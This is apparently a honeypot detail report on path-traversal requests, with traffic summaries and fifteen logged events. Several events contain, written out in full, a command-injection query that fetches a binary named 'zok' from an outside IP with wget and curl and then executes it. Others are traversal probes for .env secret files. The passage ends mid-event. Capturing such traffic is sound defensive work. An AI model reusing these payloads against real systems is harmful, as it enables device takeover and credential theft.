@@ -1,0 +1,3976 @@
+========================================================================
+DETAIL REPORT: PATH TRAVERSAL ATTEMPT
+========================================================================
+
+Classification:  path_traversal_attempt
+Severity:        HIGH
+Description:     Attempts to escape the web root using ../ sequences, often targeting CGI binaries like /bin/sh for remote code execution.
+
+SUMMARY
+----------------------------------------
+  Total events:        93
+  With response:       93
+  Without response:    0
+  Unique attacker IPs: 5
+  Unique paths:        18
+  Unique hosts:        13
+  First seen:          2026-06-09T04:48:05.929489+00:00
+  Last seen:           2026-06-16T07:57:39.444368+00:00
+
+LIKELY CVE / EXPLOIT SIGNATURES
+----------------------------------------
+  Heuristic mapping from request paths, queries, and bodies.
+
+     57  TECH-ENV-EXPOSURE   [HIGH    ]  Application configuration
+         Exposed environment file (.env) (confirmed)
+         paths: /../.env, /../../.env
+      9  CVE-2024-3400       [CRITICAL]  Palo Alto PAN-OS
+         Palo Alto PAN-OS GlobalProtect command injection (confirmed)
+         paths: /api/auth/validate-sso/../../../proxy/users/api/v2
+
+HTTP METHODS
+----------------------------------------
+  GET              93
+
+RESPONSE STATUS CODES
+----------------------------------------
+  400     61
+  429     19
+  302      6
+  404      6
+  301      1
+
+TOP PATHS
+----------------------------------------
+     10  /../.env
+     10  /../../.env
+      9  /api/auth/validate-sso/../../../proxy/users/api/v2/ucs/update/latest_package
+      8  /..\.env
+      7  /../.env.local
+      7  /../../../.env
+      7  /../../.env.local
+      7  /../.env.production
+      7  /../../../../.env
+      6  /..\..\env
+
+TOP QUERY STRINGS
+----------------------------------------
+      9  pkg_name=x$(%0Acd+%2Ftmp+%7C%7C+cd+%2Fvar%2Frun+%7C%7C+cd+%2Fmnt+%7C%7C+cd+%2Froot+%7C%7C+cd+%2F%3B+busybox+wget+http%3A%2F%2F185.228.26.16%2Fzok+-O+zok%3B+curl+-o+zok+http%3A%2F%2F185.228.26.16%2Fzok%3B+wget+http%3A%2F%2F185.228.26.16%2Fzok%3B+chmod+777+zok%3B+.%2Fzok+unifi.exploit%0A)&by_cmd=true
+      1  lang=../../../../../../../../tmp/index1
+
+TOP ATTACKER IPs
+----------------------------------------
+  151.243.150.23           62
+  176.65.144.128           18
+  176.65.148.183            9
+  204.76.203.51             3
+  8.222.225.103             1
+
+USER-AGENTS
+----------------------------------------
+     80  Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bo
+      9  Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.3
+      3  Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:146.0) Gecko/2010010
+      1  Custom-AsyncHttpClient
+
+========================================================================
+EVENT #1 of 93
+========================================================================
+  Request ID:     1780980485929487826-30
+  Timestamp:      2026-06-09T04:48:05.929489231Z
+  Client IP:      176.65.148.183
+  Method:         GET
+  Host:           145.220.231.110:443
+  URL:            /api/auth/validate-sso/..%2f..%2f..%2fproxy/users/api/v2/ucs/update/latest_package?pkg_name=x$(%0Acd+%2Ftmp+%7C%7C+cd+%2Fvar%2Frun+%7C%7C+cd+%2Fmnt+%7C%7C+cd+%2Froot+%7C%7C+cd+%2F%3B+busybox+wget+http%3A%2F%2F185.228.26.16%2Fzok+-O+zok%3B+curl+-o+zok+http%3A%2F%2F185.228.26.16%2Fzok%3B+wget+http%3A%2F%2F185.228.26.16%2Fzok%3B+chmod+777+zok%3B+.%2Fzok+unifi.exploit%0A)&by_cmd=true
+  Path:           /api/auth/validate-sso/../../../proxy/users/api/v2/ucs/update/latest_package
+  Query:          pkg_name=x$(%0Acd+%2Ftmp+%7C%7C+cd+%2Fvar%2Frun+%7C%7C+cd+%2Fmnt+%7C%7C+cd+%2Froot+%7C%7C+cd+%2F%3B+busybox+wget+http%3A%2F%2F185.228.26.16%2Fzok+-O+zok%3B+curl+-o+zok+http%3A%2F%2F185.228.26.16%2Fzok%3B+wget+http%3A%2F%2F185.228.26.16%2Fzok%3B+chmod+777+zok%3B+.%2Fzok+unifi.exploit%0A)&by_cmd=true
+  User-Agent:     Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36
+  Forwarded to:   https://localhost:8082
+  Experiment:     hardened
+  Likely CVE:     CVE-2024-3400 — Palo Alto PAN-OS GlobalProtect command injection (Palo Alto PAN-OS, confirmed)
+  Request headers:
+    Connection: close
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36
+  TLS version:    TLS 1.3
+  Cipher suite:   TLS_AES_128_GCM_SHA256
+  Response:
+    Status:       302 302 Found
+    Duration:     7 ms
+    Headers:
+      Cache-Control: no-cache, must-revalidate, max-age=0
+      Content-Length: 0
+      Content-Type: text/html; charset=UTF-8
+      Date: Tue, 09 Jun 2026 04:48:05 GMT
+      Expires: Wed, 11 Jan 1984 05:00:00 GMT
+      Location: https://145.220.231.110:443/wp-admin/install.php
+      Permissions-Policy: geolocation=(), microphone=()
+      Referrer-Policy: strict-origin-when-cross-origin
+      Server: nginx/1.31.1
+      X-Content-Type-Options: nosniff
+      X-Frame-Options: SAMEORIGIN
+      X-Redirect-By: WordPress
+      X-Xss-Protection: 1; mode=block
+    Body (0 chars):
+    (empty)
+
+========================================================================
+EVENT #2 of 93
+========================================================================
+  Request ID:     1780983795819171616-117
+  Timestamp:      2026-06-09T05:43:15.819173146Z
+  Client IP:      176.65.148.183
+  Method:         GET
+  Host:           145.220.231.104:443
+  URL:            /api/auth/validate-sso/..%2f..%2f..%2fproxy/users/api/v2/ucs/update/latest_package?pkg_name=x$(%0Acd+%2Ftmp+%7C%7C+cd+%2Fvar%2Frun+%7C%7C+cd+%2Fmnt+%7C%7C+cd+%2Froot+%7C%7C+cd+%2F%3B+busybox+wget+http%3A%2F%2F185.228.26.16%2Fzok+-O+zok%3B+curl+-o+zok+http%3A%2F%2F185.228.26.16%2Fzok%3B+wget+http%3A%2F%2F185.228.26.16%2Fzok%3B+chmod+777+zok%3B+.%2Fzok+unifi.exploit%0A)&by_cmd=true
+  Path:           /api/auth/validate-sso/../../../proxy/users/api/v2/ucs/update/latest_package
+  Query:          pkg_name=x$(%0Acd+%2Ftmp+%7C%7C+cd+%2Fvar%2Frun+%7C%7C+cd+%2Fmnt+%7C%7C+cd+%2Froot+%7C%7C+cd+%2F%3B+busybox+wget+http%3A%2F%2F185.228.26.16%2Fzok+-O+zok%3B+curl+-o+zok+http%3A%2F%2F185.228.26.16%2Fzok%3B+wget+http%3A%2F%2F185.228.26.16%2Fzok%3B+chmod+777+zok%3B+.%2Fzok+unifi.exploit%0A)&by_cmd=true
+  User-Agent:     Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36
+  Forwarded to:   https://localhost:8082
+  Experiment:     hardened
+  Likely CVE:     CVE-2024-3400 — Palo Alto PAN-OS GlobalProtect command injection (Palo Alto PAN-OS, confirmed)
+  Request headers:
+    Connection: close
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36
+  TLS version:    TLS 1.3
+  Cipher suite:   TLS_AES_128_GCM_SHA256
+  Response:
+    Status:       302 302 Found
+    Duration:     6 ms
+    Headers:
+      Cache-Control: no-cache, must-revalidate, max-age=0
+      Content-Length: 0
+      Content-Type: text/html; charset=UTF-8
+      Date: Tue, 09 Jun 2026 05:43:15 GMT
+      Expires: Wed, 11 Jan 1984 05:00:00 GMT
+      Location: https://145.220.231.104:443/wp-admin/install.php
+      Permissions-Policy: geolocation=(), microphone=()
+      Referrer-Policy: strict-origin-when-cross-origin
+      Server: nginx/1.31.1
+      X-Content-Type-Options: nosniff
+      X-Frame-Options: SAMEORIGIN
+      X-Redirect-By: WordPress
+      X-Xss-Protection: 1; mode=block
+    Body (0 chars):
+    (empty)
+
+========================================================================
+EVENT #3 of 93
+========================================================================
+  Request ID:     1780992559121715737-1045
+  Timestamp:      2026-06-09T08:09:19.1217165Z
+  Client IP:      176.65.144.128
+  Method:         GET
+  Host:           145.220.231.109
+  URL:            /../.env
+  Path:           /../.env
+  User-Agent:     Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  Forwarded to:   https://localhost:8082
+  Experiment:     hardened
+  Likely CVE:     TECH-ENV-EXPOSURE — Exposed environment file (.env) (Application configuration, confirmed)
+  Request headers:
+    Accept: */*
+    Accept-Encoding: gzip
+    User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  TLS version:    TLS 1.3
+  Cipher suite:   TLS_AES_128_GCM_SHA256
+  Response:
+    Status:       400 400 Bad Request
+    Duration:     0 ms
+    Headers:
+      Content-Length: 157
+      Content-Type: text/html
+      Date: Tue, 09 Jun 2026 08:09:19 GMT
+      Permissions-Policy: geolocation=(), microphone=()
+      Referrer-Policy: strict-origin-when-cross-origin
+      Server: nginx/1.31.1
+      X-Content-Type-Options: nosniff
+      X-Frame-Options: SAMEORIGIN
+      X-Xss-Protection: 1; mode=block
+    Body (157 chars):
+    <html>
+    <head><title>400 Bad Request</title></head>
+    <body>
+    <center><h1>400 Bad Request</h1></center>
+    <hr><center>nginx/1.31.1</center>
+    </body>
+    </html>
+
+========================================================================
+EVENT #4 of 93
+========================================================================
+  Request ID:     1780992559124745068-1048
+  Timestamp:      2026-06-09T08:09:19.124745833Z
+  Client IP:      176.65.144.128
+  Method:         GET
+  Host:           145.220.231.109
+  URL:            /../.env.local
+  Path:           /../.env.local
+  User-Agent:     Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  Forwarded to:   https://localhost:8082
+  Experiment:     hardened
+  Likely CVE:     TECH-ENV-EXPOSURE — Exposed environment file (.env) (Application configuration, confirmed)
+  Request headers:
+    Accept: */*
+    Accept-Encoding: gzip
+    User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  TLS version:    TLS 1.3
+  Cipher suite:   TLS_AES_128_GCM_SHA256
+  Response:
+    Status:       400 400 Bad Request
+    Duration:     0 ms
+    Headers:
+      Content-Length: 157
+      Content-Type: text/html
+      Date: Tue, 09 Jun 2026 08:09:19 GMT
+      Permissions-Policy: geolocation=(), microphone=()
+      Referrer-Policy: strict-origin-when-cross-origin
+      Server: nginx/1.31.1
+      X-Content-Type-Options: nosniff
+      X-Frame-Options: SAMEORIGIN
+      X-Xss-Protection: 1; mode=block
+    Body (157 chars):
+    <html>
+    <head><title>400 Bad Request</title></head>
+    <body>
+    <center><h1>400 Bad Request</h1></center>
+    <hr><center>nginx/1.31.1</center>
+    </body>
+    </html>
+
+========================================================================
+EVENT #5 of 93
+========================================================================
+  Request ID:     1780992559124751257-1049
+  Timestamp:      2026-06-09T08:09:19.124751748Z
+  Client IP:      176.65.144.128
+  Method:         GET
+  Host:           145.220.231.109
+  URL:            /../../../.env
+  Path:           /../../../.env
+  User-Agent:     Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  Forwarded to:   https://localhost:8082
+  Experiment:     hardened
+  Likely CVE:     TECH-ENV-EXPOSURE — Exposed environment file (.env) (Application configuration, confirmed)
+  Request headers:
+    Accept: */*
+    Accept-Encoding: gzip
+    User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  TLS version:    TLS 1.3
+  Cipher suite:   TLS_AES_128_GCM_SHA256
+  Response:
+    Status:       400 400 Bad Request
+    Duration:     0 ms
+    Headers:
+      Content-Length: 157
+      Content-Type: text/html
+      Date: Tue, 09 Jun 2026 08:09:19 GMT
+      Permissions-Policy: geolocation=(), microphone=()
+      Referrer-Policy: strict-origin-when-cross-origin
+      Server: nginx/1.31.1
+      X-Content-Type-Options: nosniff
+      X-Frame-Options: SAMEORIGIN
+      X-Xss-Protection: 1; mode=block
+    Body (157 chars):
+    <html>
+    <head><title>400 Bad Request</title></head>
+    <body>
+    <center><h1>400 Bad Request</h1></center>
+    <hr><center>nginx/1.31.1</center>
+    </body>
+    </html>
+
+========================================================================
+EVENT #6 of 93
+========================================================================
+  Request ID:     1780992559124941522-1050
+  Timestamp:      2026-06-09T08:09:19.124942139Z
+  Client IP:      176.65.144.128
+  Method:         GET
+  Host:           145.220.231.109
+  URL:            /../../.env.local
+  Path:           /../../.env.local
+  User-Agent:     Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  Forwarded to:   https://localhost:8082
+  Experiment:     hardened
+  Likely CVE:     TECH-ENV-EXPOSURE — Exposed environment file (.env) (Application configuration, confirmed)
+  Request headers:
+    Accept: */*
+    Accept-Encoding: gzip
+    User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  TLS version:    TLS 1.3
+  Cipher suite:   TLS_AES_128_GCM_SHA256
+  Response:
+    Status:       400 400 Bad Request
+    Duration:     0 ms
+    Headers:
+      Content-Length: 157
+      Content-Type: text/html
+      Date: Tue, 09 Jun 2026 08:09:19 GMT
+      Permissions-Policy: geolocation=(), microphone=()
+      Referrer-Policy: strict-origin-when-cross-origin
+      Server: nginx/1.31.1
+      X-Content-Type-Options: nosniff
+      X-Frame-Options: SAMEORIGIN
+      X-Xss-Protection: 1; mode=block
+    Body (157 chars):
+    <html>
+    <head><title>400 Bad Request</title></head>
+    <body>
+    <center><h1>400 Bad Request</h1></center>
+    <hr><center>nginx/1.31.1</center>
+    </body>
+    </html>
+
+========================================================================
+EVENT #7 of 93
+========================================================================
+  Request ID:     1780992559125144705-1051
+  Timestamp:      2026-06-09T08:09:19.125145367Z
+  Client IP:      176.65.144.128
+  Method:         GET
+  Host:           145.220.231.109
+  URL:            /../.env.production
+  Path:           /../.env.production
+  User-Agent:     Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  Forwarded to:   https://localhost:8082
+  Experiment:     hardened
+  Likely CVE:     TECH-ENV-EXPOSURE — Exposed environment file (.env) (Application configuration, confirmed)
+  Request headers:
+    Accept: */*
+    Accept-Encoding: gzip
+    User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  TLS version:    TLS 1.3
+  Cipher suite:   TLS_AES_128_GCM_SHA256
+  Response:
+    Status:       400 400 Bad Request
+    Duration:     0 ms
+    Headers:
+      Content-Length: 157
+      Content-Type: text/html
+      Date: Tue, 09 Jun 2026 08:09:19 GMT
+      Permissions-Policy: geolocation=(), microphone=()
+      Referrer-Policy: strict-origin-when-cross-origin
+      Server: nginx/1.31.1
+      X-Content-Type-Options: nosniff
+      X-Frame-Options: SAMEORIGIN
+      X-Xss-Protection: 1; mode=block
+    Body (157 chars):
+    <html>
+    <head><title>400 Bad Request</title></head>
+    <body>
+    <center><h1>400 Bad Request</h1></center>
+    <hr><center>nginx/1.31.1</center>
+    </body>
+    </html>
+
+========================================================================
+EVENT #8 of 93
+========================================================================
+  Request ID:     1780992559127865746-1055
+  Timestamp:      2026-06-09T08:09:19.127866353Z
+  Client IP:      176.65.144.128
+  Method:         GET
+  Host:           145.220.231.109
+  URL:            /..%5C.env
+  Path:           /..\.env
+  User-Agent:     Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  Forwarded to:   https://localhost:8082
+  Experiment:     hardened
+  Request headers:
+    Accept: */*
+    Accept-Encoding: gzip
+    User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  TLS version:    TLS 1.3
+  Cipher suite:   TLS_AES_128_GCM_SHA256
+  Response:
+    Status:       429 429 Too Many Requests
+    Duration:     0 ms
+    Headers:
+      Connection: keep-alive
+      Content-Length: 169
+      Content-Type: text/html
+      Date: Tue, 09 Jun 2026 08:09:19 GMT
+      Permissions-Policy: geolocation=(), microphone=()
+      Referrer-Policy: strict-origin-when-cross-origin
+      Server: nginx/1.31.1
+      X-Content-Type-Options: nosniff
+      X-Frame-Options: SAMEORIGIN
+      X-Xss-Protection: 1; mode=block
+    Body (169 chars):
+    <html>
+    <head><title>429 Too Many Requests</title></head>
+    <body>
+    <center><h1>429 Too Many Requests</h1></center>
+    <hr><center>nginx/1.31.1</center>
+    </body>
+    </html>
+
+========================================================================
+EVENT #9 of 93
+========================================================================
+  Request ID:     1780992559128572974-1058
+  Timestamp:      2026-06-09T08:09:19.128574055Z
+  Client IP:      176.65.144.128
+  Method:         GET
+  Host:           145.220.231.109
+  URL:            /../../.env
+  Path:           /../../.env
+  User-Agent:     Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  Forwarded to:   https://localhost:8082
+  Experiment:     hardened
+  Likely CVE:     TECH-ENV-EXPOSURE — Exposed environment file (.env) (Application configuration, confirmed)
+  Request headers:
+    Accept: */*
+    Accept-Encoding: gzip
+    User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  TLS version:    TLS 1.3
+  Cipher suite:   TLS_AES_128_GCM_SHA256
+  Response:
+    Status:       400 400 Bad Request
+    Duration:     0 ms
+    Headers:
+      Content-Length: 157
+      Content-Type: text/html
+      Date: Tue, 09 Jun 2026 08:09:19 GMT
+      Permissions-Policy: geolocation=(), microphone=()
+      Referrer-Policy: strict-origin-when-cross-origin
+      Server: nginx/1.31.1
+      X-Content-Type-Options: nosniff
+      X-Frame-Options: SAMEORIGIN
+      X-Xss-Protection: 1; mode=block
+    Body (157 chars):
+    <html>
+    <head><title>400 Bad Request</title></head>
+    <body>
+    <center><h1>400 Bad Request</h1></center>
+    <hr><center>nginx/1.31.1</center>
+    </body>
+    </html>
+
+========================================================================
+EVENT #10 of 93
+========================================================================
+  Request ID:     1780992559133017207-1072
+  Timestamp:      2026-06-09T08:09:19.133017898Z
+  Client IP:      176.65.144.128
+  Method:         GET
+  Host:           145.220.231.109
+  URL:            /../../../../.env
+  Path:           /../../../../.env
+  User-Agent:     Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  Forwarded to:   https://localhost:8082
+  Experiment:     hardened
+  Likely CVE:     TECH-ENV-EXPOSURE — Exposed environment file (.env) (Application configuration, confirmed)
+  Request headers:
+    Accept: */*
+    Accept-Encoding: gzip
+    User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  TLS version:    TLS 1.3
+  Cipher suite:   TLS_AES_128_GCM_SHA256
+  Response:
+    Status:       400 400 Bad Request
+    Duration:     0 ms
+    Headers:
+      Content-Length: 157
+      Content-Type: text/html
+      Date: Tue, 09 Jun 2026 08:09:19 GMT
+      Permissions-Policy: geolocation=(), microphone=()
+      Referrer-Policy: strict-origin-when-cross-origin
+      Server: nginx/1.31.1
+      X-Content-Type-Options: nosniff
+      X-Frame-Options: SAMEORIGIN
+      X-Xss-Protection: 1; mode=block
+    Body (157 chars):
+    <html>
+    <head><title>400 Bad Request</title></head>
+    <body>
+    <center><h1>400 Bad Request</h1></center>
+    <hr><center>nginx/1.31.1</center>
+    </body>
+    </html>
+
+========================================================================
+EVENT #11 of 93
+========================================================================
+  Request ID:     1780992571263002168-1774
+  Timestamp:      2026-06-09T08:09:31.263003785Z
+  Client IP:      176.65.144.128
+  Method:         GET
+  Host:           145.220.231.109
+  URL:            /..%5C..%5Cenv
+  Path:           /..\..\env
+  User-Agent:     Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  Forwarded to:   https://localhost:8082
+  Experiment:     hardened
+  Request headers:
+    Accept: */*
+    Accept-Encoding: gzip
+    User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  TLS version:    TLS 1.3
+  Cipher suite:   TLS_AES_128_GCM_SHA256
+  Response:
+    Status:       302 302 Found
+    Duration:     91 ms
+    Headers:
+      Cache-Control: no-cache, must-revalidate, max-age=0
+      Connection: keep-alive
+      Content-Length: 0
+      Content-Type: text/html; charset=UTF-8
+      Date: Tue, 09 Jun 2026 08:09:31 GMT
+      Expires: Wed, 11 Jan 1984 05:00:00 GMT
+      Location: https://145.220.231.109/wp-admin/install.php
+      Permissions-Policy: geolocation=(), microphone=()
+      Referrer-Policy: strict-origin-when-cross-origin
+      Server: nginx/1.31.1
+      X-Content-Type-Options: nosniff
+      X-Frame-Options: SAMEORIGIN
+      X-Redirect-By: WordPress
+      X-Xss-Protection: 1; mode=block
+    Body (0 chars):
+    (empty)
+
+========================================================================
+EVENT #12 of 93
+========================================================================
+  Request ID:     1780992571263054625-1776
+  Timestamp:      2026-06-09T08:09:31.26307065Z
+  Client IP:      176.65.144.128
+  Method:         GET
+  Host:           145.220.231.109
+  URL:            /..%5C..%5C..%5Cenv
+  Path:           /..\..\..\env
+  User-Agent:     Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  Forwarded to:   https://localhost:8082
+  Experiment:     hardened
+  Request headers:
+    Accept: */*
+    Accept-Encoding: gzip
+    User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  TLS version:    TLS 1.3
+  Cipher suite:   TLS_AES_128_GCM_SHA256
+  Response:
+    Status:       429 429 Too Many Requests
+    Duration:     91 ms
+    Headers:
+      Connection: keep-alive
+      Content-Length: 169
+      Content-Type: text/html
+      Date: Tue, 09 Jun 2026 08:09:31 GMT
+      Permissions-Policy: geolocation=(), microphone=()
+      Referrer-Policy: strict-origin-when-cross-origin
+      Server: nginx/1.31.1
+      X-Content-Type-Options: nosniff
+      X-Frame-Options: SAMEORIGIN
+      X-Xss-Protection: 1; mode=block
+    Body (169 chars):
+    <html>
+    <head><title>429 Too Many Requests</title></head>
+    <body>
+    <center><h1>429 Too Many Requests</h1></center>
+    <hr><center>nginx/1.31.1</center>
+    </body>
+    </html>
+
+========================================================================
+EVENT #13 of 93
+========================================================================
+  Request ID:     1780996942463162974-2315
+  Timestamp:      2026-06-09T09:22:22.463164058Z
+  Client IP:      176.65.148.183
+  Method:         GET
+  Host:           145.220.231.107:443
+  URL:            /api/auth/validate-sso/..%2f..%2f..%2fproxy/users/api/v2/ucs/update/latest_package?pkg_name=x$(%0Acd+%2Ftmp+%7C%7C+cd+%2Fvar%2Frun+%7C%7C+cd+%2Fmnt+%7C%7C+cd+%2Froot+%7C%7C+cd+%2F%3B+busybox+wget+http%3A%2F%2F185.228.26.16%2Fzok+-O+zok%3B+curl+-o+zok+http%3A%2F%2F185.228.26.16%2Fzok%3B+wget+http%3A%2F%2F185.228.26.16%2Fzok%3B+chmod+777+zok%3B+.%2Fzok+unifi.exploit%0A)&by_cmd=true
+  Path:           /api/auth/validate-sso/../../../proxy/users/api/v2/ucs/update/latest_package
+  Query:          pkg_name=x$(%0Acd+%2Ftmp+%7C%7C+cd+%2Fvar%2Frun+%7C%7C+cd+%2Fmnt+%7C%7C+cd+%2Froot+%7C%7C+cd+%2F%3B+busybox+wget+http%3A%2F%2F185.228.26.16%2Fzok+-O+zok%3B+curl+-o+zok+http%3A%2F%2F185.228.26.16%2Fzok%3B+wget+http%3A%2F%2F185.228.26.16%2Fzok%3B+chmod+777+zok%3B+.%2Fzok+unifi.exploit%0A)&by_cmd=true
+  User-Agent:     Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36
+  Forwarded to:   https://localhost:8082
+  Experiment:     hardened
+  Likely CVE:     CVE-2024-3400 — Palo Alto PAN-OS GlobalProtect command injection (Palo Alto PAN-OS, confirmed)
+  Request headers:
+    Connection: close
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36
+  TLS version:    TLS 1.3
+  Cipher suite:   TLS_AES_128_GCM_SHA256
+  Response:
+    Status:       302 302 Found
+    Duration:     6 ms
+    Headers:
+      Cache-Control: no-cache, must-revalidate, max-age=0
+      Content-Length: 0
+      Content-Type: text/html; charset=UTF-8
+      Date: Tue, 09 Jun 2026 09:22:22 GMT
+      Expires: Wed, 11 Jan 1984 05:00:00 GMT
+      Location: https://145.220.231.107:443/wp-admin/install.php
+      Permissions-Policy: geolocation=(), microphone=()
+      Referrer-Policy: strict-origin-when-cross-origin
+      Server: nginx/1.31.1
+      X-Content-Type-Options: nosniff
+      X-Frame-Options: SAMEORIGIN
+      X-Redirect-By: WordPress
+      X-Xss-Protection: 1; mode=block
+    Body (0 chars):
+    (empty)
+
+========================================================================
+EVENT #14 of 93
+========================================================================
+  Request ID:     1781005505751905819-3100
+  Timestamp:      2026-06-09T11:45:05.751907189Z
+  Client IP:      176.65.148.183
+  Method:         GET
+  Host:           145.220.231.106:443
+  URL:            /api/auth/validate-sso/..%2f..%2f..%2fproxy/users/api/v2/ucs/update/latest_package?pkg_name=x$(%0Acd+%2Ftmp+%7C%7C+cd+%2Fvar%2Frun+%7C%7C+cd+%2Fmnt+%7C%7C+cd+%2Froot+%7C%7C+cd+%2F%3B+busybox+wget+http%3A%2F%2F185.228.26.16%2Fzok+-O+zok%3B+curl+-o+zok+http%3A%2F%2F185.228.26.16%2Fzok%3B+wget+http%3A%2F%2F185.228.26.16%2Fzok%3B+chmod+777+zok%3B+.%2Fzok+unifi.exploit%0A)&by_cmd=true
+  Path:           /api/auth/validate-sso/../../../proxy/users/api/v2/ucs/update/latest_package
+  Query:          pkg_name=x$(%0Acd+%2Ftmp+%7C%7C+cd+%2Fvar%2Frun+%7C%7C+cd+%2Fmnt+%7C%7C+cd+%2Froot+%7C%7C+cd+%2F%3B+busybox+wget+http%3A%2F%2F185.228.26.16%2Fzok+-O+zok%3B+curl+-o+zok+http%3A%2F%2F185.228.26.16%2Fzok%3B+wget+http%3A%2F%2F185.228.26.16%2Fzok%3B+chmod+777+zok%3B+.%2Fzok+unifi.exploit%0A)&by_cmd=true
+  User-Agent:     Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36
+  Forwarded to:   https://localhost:8082
+  Experiment:     hardened
+  Likely CVE:     CVE-2024-3400 — Palo Alto PAN-OS GlobalProtect command injection (Palo Alto PAN-OS, confirmed)
+  Request headers:
+    Connection: close
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36
+  TLS version:    TLS 1.3
+  Cipher suite:   TLS_AES_128_GCM_SHA256
+  Response:
+    Status:       302 302 Found
+    Duration:     119 ms
+    Headers:
+      Cache-Control: no-cache, must-revalidate, max-age=0
+      Content-Length: 0
+      Content-Type: text/html; charset=UTF-8
+      Date: Tue, 09 Jun 2026 11:45:05 GMT
+      Expires: Wed, 11 Jan 1984 05:00:00 GMT
+      Location: https://145.220.231.106:443/wp-admin/install.php
+      Permissions-Policy: geolocation=(), microphone=()
+      Referrer-Policy: strict-origin-when-cross-origin
+      Server: nginx/1.31.1
+      X-Content-Type-Options: nosniff
+      X-Frame-Options: SAMEORIGIN
+      X-Redirect-By: WordPress
+      X-Xss-Protection: 1; mode=block
+    Body (0 chars):
+    (empty)
+
+========================================================================
+EVENT #15 of 93
+========================================================================
+  Request ID:     1781005953183422969-3103
+  Timestamp:      2026-06-09T11:52:33.183424366Z
+  Client IP:      176.65.148.183
+  Method:         GET
+  Host:           145.220.231.111:443
+  URL:            /api/auth/validate-sso/..%2f..%2f..%2fproxy/users/api/v2/ucs/update/latest_package?pkg_name=x$(%0Acd+%2Ftmp+%7C%7C+cd+%2Fvar%2Frun+%7C%7C+cd+%2Fmnt+%7C%7C+cd+%2Froot+%7C%7C+cd+%2F%3B+busybox+wget+http%3A%2F%2F185.228.26.16%2Fzok+-O+zok%3B+curl+-o+zok+http%3A%2F%2F185.228.26.16%2Fzok%3B+wget+http%3A%2F%2F185.228.26.16%2Fzok%3B+chmod+777+zok%3B+.%2Fzok+unifi.exploit%0A)&by_cmd=true
+  Path:           /api/auth/validate-sso/../../../proxy/users/api/v2/ucs/update/latest_package
+  Query:          pkg_name=x$(%0Acd+%2Ftmp+%7C%7C+cd+%2Fvar%2Frun+%7C%7C+cd+%2Fmnt+%7C%7C+cd+%2Froot+%7C%7C+cd+%2F%3B+busybox+wget+http%3A%2F%2F185.228.26.16%2Fzok+-O+zok%3B+curl+-o+zok+http%3A%2F%2F185.228.26.16%2Fzok%3B+wget+http%3A%2F%2F185.228.26.16%2Fzok%3B+chmod+777+zok%3B+.%2Fzok+unifi.exploit%0A)&by_cmd=true
+  User-Agent:     Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36
+  Forwarded to:   https://localhost:8082
+  Experiment:     hardened
+  Likely CVE:     CVE-2024-3400 — Palo Alto PAN-OS GlobalProtect command injection (Palo Alto PAN-OS, confirmed)
+  Request headers:
+    Connection: close
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36
+  TLS version:    TLS 1.3
+  Cipher suite:   TLS_AES_128_GCM_SHA256
+  Response:
+    Status:       302 302 Found
+    Duration:     65 ms
+    Headers:
+      Cache-Control: no-cache, must-revalidate, max-age=0
+      Content-Length: 0
+      Content-Type: text/html; charset=UTF-8
+      Date: Tue, 09 Jun 2026 11:52:33 GMT
+      Expires: Wed, 11 Jan 1984 05:00:00 GMT
